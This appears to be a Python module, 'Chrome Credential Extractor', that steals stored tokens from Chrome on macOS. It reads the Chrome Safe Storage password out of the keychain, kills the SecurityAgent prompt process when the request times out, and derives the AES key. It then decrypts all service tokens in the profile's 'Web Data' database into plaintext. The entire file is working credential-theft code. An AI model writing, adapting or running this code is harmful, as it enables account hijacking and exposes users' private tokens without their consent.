# flake8: noqa
#!/usr/bin/env python3
"""
Chrome Credential Extractor

This module provides classes for extracting and decrypting credentials from Chrome.
"""

import logging
import os
import shutil
import signal
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes, padding
    from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError:
    print(
        "Required cryptography package not found. Install it with: pip install cryptography"
    )
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class ChromeProfileManager:
    """Manages Chrome profile detection and file operations."""

    @staticmethod
    def get_chrome_base_dir():
        """Returns the base Chrome directory on macOS."""
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")

    @classmethod
    def list_available_profiles(cls):
        """Lists all available Chrome profiles on the system by scanning the directory."""
        base_dir = cls.get_chrome_base_dir()
        available_profiles = []

        try:
            # List all items in the Chrome directory
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Check if it's a directory
                if os.path.isdir(item_path):
                    # Verify it's a profile by checking for Web Data file
                    web_data_path = os.path.join(item_path, "Web Data")

                    if os.path.exists(web_data_path):
                        available_profiles.append(item)

            logger.info(
                f"Found {len(available_profiles)} Chrome profiles: {', '.join(available_profiles)}"
            )
            return available_profiles
        except Exception as e:
            logger.error(f"Error listing Chrome profiles: {e}")
            return []

    @classmethod
    def get_profile_path(cls, profile_name):
        """Gets the full path for a specific Chrome profile."""
        return os.path.join(cls.get_chrome_base_dir(), profile_name)


class ChromeCredentialExtractor:
    """Extracts and decrypts credentials from Chrome."""

    def __init__(self, profile="Default", timeout=30):
        """
        Initialize the Chrome credential extractor.

        Args:
            profile: Chrome profile name to use
            timeout: Timeout for security command in seconds (default: 30)
        """
        self.profile = profile
        self.timeout = timeout
        self.profile_path = ChromeProfileManager.get_profile_path(profile)
        self.temp_dir = None
        self.storage_password = None
        self.master_key = None

    def __enter__(self):
        """Context manager entry point."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit point for cleanup."""
        self.cleanup()

    def cleanup(self):
        """Clean up temporary resources."""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
                logger.debug(f"Removed temporary directory: {self.temp_dir}")
            except Exception as e:
                logger.error(f"Failed to remove temporary directory: {e}")

    def create_temp_copy(self, file_name="Web Data"):
        """
        Creates a temporary copy of a Chrome data file.

        Args:
            file_name: Name of the file to copy

        Returns:
            Path to the temporary directory or None if failed
        """
        try:
            self.temp_dir = tempfile.mkdtemp()
            src_file = os.path.join(self.profile_path, file_name)
            dst_file = os.path.join(self.temp_dir, file_name)

            if not os.path.exists(src_file):
                logger.error(f"Source file not found: {src_file}")
                return None

            shutil.copy(src_file, dst_file)
            logger.info(f"Created temporary copy of {file_name} at {self.temp_dir}")
            return self.temp_dir
        except Exception as e:
            logger.error(f"Failed to create temporary copy: {e}")
            self.cleanup()
            return None

    def get_chrome_storage_pass(self):
        """
        Retrieves the Chrome safe storage password from macOS keychain.

        Returns:
            The Chrome safe storage password or None if failed
        """
        command = "/usr/bin/security find-generic-password -ga 'Chrome'"
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )

        if not process.pid:
            logger.error("Failed to create 'security' process")
            return None

        security_pid = process.pid
        logger.debug(f"Started 'security' process with PID: {security_pid}")

        # Set up timer to terminate SecurityAgent if it takes too long
        timer = threading.Timer(
            self.timeout, self._terminate_security_process, [process, security_pid]
        )

        try:
            timer.start()
            stdout, stderr = process.communicate()

            if stderr:
                start = stderr.find(b'password: "') + len(b'password: "')
                end = stderr.find(b'"', start)

                if start != -1 and end != -1:
                    password = stderr[start:end].decode("utf-8")
                    logger.info("Chrome storage password successfully retrieved")
                    self.storage_password = password
                    return password
                else:
                    logger.error("Password format not found in output")
            else:
                logger.error("No password found in keychain output")

            return None
        except Exception as e:
            logger.error(f"Error retrieving Chrome storage password: {e}")
            return None
        finally:
            timer.cancel()

    def _terminate_security_process(self, proc, security_pid):
        """
        Terminates the SecurityAgent process and the security process.

        Args:
            proc: The subprocess.Popen object for the security process
            security_pid: PID of the security process
        """
        try:
            # Look for SecurityAgent in a range of PIDs after the security process
            for pid_offset in range(1, 4):
                possible_agent_pid = security_pid + pid_offset
                try:
                    ps_command = f"ps -o comm= -p {possible_agent_pid}"
                    ps_output = subprocess.check_output(
                        ps_command, shell=True, text=True
                    ).strip()

                    if "SecurityAgent" in ps_output:
                        logger.info(
                            f"Terminating SecurityAgent with PID {possible_agent_pid}"
                        )
                        os.kill(possible_agent_pid, signal.SIGKILL)
                        time.sleep(0.5)
                        break
                except (subprocess.CalledProcessError, PermissionError) as e:
                    logger.debug(f"No SecurityAgent at PID {possible_agent_pid}: {e}")

            # Check if the main security process is still running
            if proc.poll() is None:
                proc.kill()
                logger.info(f"Terminated security process with PID {security_pid}")
        except Exception as e:
            logger.error(f"Error terminating processes: {e}")

    def derive_master_key(self, password=None):
        """
        Derives the master key from the Chrome storage password.

        Args:
            password: Chrome storage password (uses stored password if None)

        Returns:
            Master key as bytes or None if failed
        """
        if password is None:
            password = self.storage_password

        if not password:
            logger.error("No password provided for master key derivation")
            return None

        try:
            # Convert password to bytes if it's a string
            password_bytes = (
                password.encode("utf-8") if isinstance(password, str) else password
            )

            salt = b"saltysalt"
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA1(),
                length=16,
                salt=salt,
                iterations=1003,
                backend=default_backend(),
            )

            key = kdf.derive(password_bytes)
            self.master_key = key
            logger.info("Master key successfully derived")
            return key
        except Exception as e:
            logger.error(f"Failed to derive master key: {e}")
            return None

    def decrypt_token(self, encrypted_token):
        """
        Decrypts a Chrome token using the master key.

        Args:
            encrypted_token: Encrypted token data

        Returns:
            Decrypted token as string or None if failed
        """
        if not self.master_key:
            logger.error("Master key not available for decryption")
            return None

        try:
            # Chrome uses a fixed IV of 16 spaces
            iv = b" " * 16

            # Skip the first 3 bytes (v10 format indicator)
            if len(encrypted_token) > 3:
                encrypted_token = encrypted_token[3:]
            else:
                logger.error("Encrypted token too short")
                return None

            cipher = Cipher(
                algorithms.AES(self.master_key),
                modes.CBC(iv),
                backend=default_backend(),
            )
            decryptor = cipher.decryptor()

            # Decrypt the data
            decrypted = decryptor.update(encrypted_token) + decryptor.finalize()

            # Handle PKCS7 padding
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            unpadded_data = unpadder.update(decrypted) + unpadder.finalize()

            return unpadded_data.decode("utf-8")
        except Exception as e:
            logger.error(f"Failed to decrypt token: {e}")
            return None

    def extract_tokens(self, temp_dir=None):
        """
        Extracts and decrypts tokens from Chrome's Web Data file.

        Args:
            temp_dir: Path to temporary directory with Web Data file

        Returns:
            List of dictionaries with service and token or None if failed
        """
        if temp_dir is None:
            temp_dir = self.temp_dir

        if not temp_dir:
            logger.error("No temporary directory provided")
            return None

        db_path = os.path.join(temp_dir, "Web Data")

        if not os.path.exists(db_path):
            logger.error(f"Database file not found: {db_path}")
            return None

        if not self.master_key:
            logger.error("Master key not available")
            return None

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()

            # Query the token_service table
            query = "SELECT service, encrypted_token FROM token_service"
            cursor.execute(query)
            rows = cursor.fetchall()

            tokens = []
            for service, encrypted_token in rows:
                token = self.decrypt_token(encrypted_token)
                if token:
                    tokens.append({"service": service, "token": token})

            conn.close()

            if tokens:
                logger.info(f"Successfully extracted {len(tokens)} tokens")
            else:
                logger.warning("No tokens found in database")

            return tokens
        except sqlite3.Error as e:
            logger.error(f"SQLite error: {e}")
            return None
        except Exception as e:
            logger.error(f"Error extracting tokens: {e}")
            return None
